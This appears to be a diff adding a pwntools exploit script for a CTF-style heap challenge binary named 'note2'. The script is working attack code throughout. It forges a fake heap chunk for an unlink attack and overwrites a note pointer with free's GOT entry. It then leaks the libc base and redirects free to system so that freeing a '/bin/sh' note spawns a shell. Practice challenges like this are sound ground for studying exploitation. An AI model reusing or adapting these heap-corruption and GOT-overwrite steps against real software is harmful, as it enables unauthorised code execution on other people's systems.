@@ -1,0 +1,63 @@
+from pwn import *
+
+e = ELF("./note2_patched")
+libc = ELF("./libc-2.19.so")
+ld = ELF("./ld-2.19.so")
+
+p = process("./note2_patched")
+'''
+p = gdb.debug("./note2_patched", gdbscript = 
+b *0x400CB3
+b *0x400F1C
+)
+'''
+def malloc(size, data):
+    p.sendlineafter(b"option--->>", b"1")
+    p.sendlineafter(b"128)\n", f"{size}".encode())
+    p.sendlineafter(b"content:\n", data)
+
+def printdata(index):
+    p.sendlineafter(b"option--->>", b"2")
+    p.sendlineafter(b"note:\n", f"{index}".encode())
+    p.recvuntil(b"is ")
+    content = u64(p.recvline()[:-1:].ljust(8, b"\x00"))
+    return content
+
+def editnote(index, choice, data):
+    p.sendlineafter(b"option--->>", b"3")
+    p.sendlineafter(b"note:\n", f"{index}".encode())
+    p.sendlineafter(b"append]\n", f"{choice}".encode())
+    p.sendlineafter(b"TheNewContents:", data)
+    
+def free(index):
+    p.sendlineafter(b"option--->>", b"4")
+    p.sendlineafter(b"note:\n", f"{index}".encode())
+    
+p.sendlineafter(b"name:\n", b"vani")
+p.sendlineafter(b"address:\n", b"vina")
+
+#ptr_arr = 0x602120
+
+fake_chunk = b""
+fake_chunk += p64(0) + p64(0x71)
+fake_chunk += p64(0x602108) + p64(0x602110)
+
+malloc(0x80, fake_chunk)
+malloc(0x0, b"A" * 0x10)
+malloc(0x80, b"A" * 8)
+
+free(1)
+malloc(0x0, b"/bin/sh\x00" + b"A" * 0x8 + p64(0xa0) + p8(0x90))
+
+free(2)
+
+free_got = e.got['free']
+editnote(0, 1, b"A" * 0x18 + p64(free_got))
+
+libc_base = printdata(0) - libc.symbols['free']
+system = libc_base + libc.symbols['system']
+editnote(0, 1, p64(system))
+
+free(3)
+
+p.interactive()
